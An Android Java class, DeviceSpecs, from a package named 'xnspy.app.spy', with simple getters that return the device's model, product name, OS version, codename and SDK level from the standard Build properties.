package xnspy.app.spy;

import android.os.Build;

public class DeviceSpecs {
    public String getModel() {
        return Build.MODEL;
    }

    public String getProductName() {
        return Build.PRODUCT;
    }

    public String getOSVersion() {
        return Build.VERSION.RELEASE;
    }

    public String getSDKVersion() {
        return Build.VERSION.SDK;
    }

    public String getVersionCodename() {
        return Build.VERSION.CODENAME;
    }

    public int getVersionSDKINT() {
        return Build.VERSION.SDK_INT;
    }
}
